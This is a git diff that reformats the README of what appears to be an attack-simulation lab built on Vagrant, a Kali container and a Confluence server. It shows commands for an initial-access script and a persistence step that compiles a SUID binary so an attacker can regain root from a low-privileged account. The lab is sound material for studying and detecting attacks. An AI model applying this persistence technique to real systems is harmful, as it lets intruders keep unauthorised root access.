@@ -142,12 +142,12 @@ HOST-MACHINE@HOST $ vagrant provision --provision-with <configured attack>
     <img src="https://user-images.githubusercontent.com/1593214/197329877-ef4c952d-2de8-49e2-84ab-fde8a30edea3.png" width="512">
 
 Steps:
-  ```
+  ```console
   host-machine $ docker exec -it kali /bin/bash
   root@kali # cd /tmp/1_InitialAccess
   root@kali # bash runme.sh
-  ...
-  ...
+  ```
+  ```console
   confluence@confluence:/opt/atlassian/confluence/bin $
   ```
 ```console
@@ -177,22 +177,22 @@ HOST-MACHINE@HOST $ vagrant provision --provision-with privesc
 - After gaining root access via privilege escalation, create suid binary to allow anyone to execute the file.
 - Allows attacker to regain root privileges from low privileged user account.
     
-    Setup
-    ```console
-    root@confluence:/# cd /tmp
-    root@confluence:/tmp# cp /vagrant/attak/persistence/binarysuid /tmp/suid.c
-    ...
-    ...
-    root@confluence:/tmp# gcc suid.c -o suid
-    root@confluence:/tmp# chmod 7111 suid
-    root@confluence:/tmp# rm suid.c
-    ```
-    Regain
-    ```console
-    confluence@confluence:/tmp$ ./suid
-    whoami
-    root
-    ```
+#### Setup
+```console
+root@confluence:/# cd /tmp
+root@confluence:/tmp# cp /vagrant/attak/persistence/binarysuid /tmp/suid.c
+```
+```console
+root@confluence:/tmp# gcc suid.c -o suid
+root@confluence:/tmp# chmod 7111 suid
+root@confluence:/tmp# rm suid.c
+```
+#### Regain
+```console
+confluence@confluence:/tmp$ ./suid
+whoami
+root
+```
 
 ```console
 HOST-MACHINE@HOST $ vagrant provision --provision-with persistence 
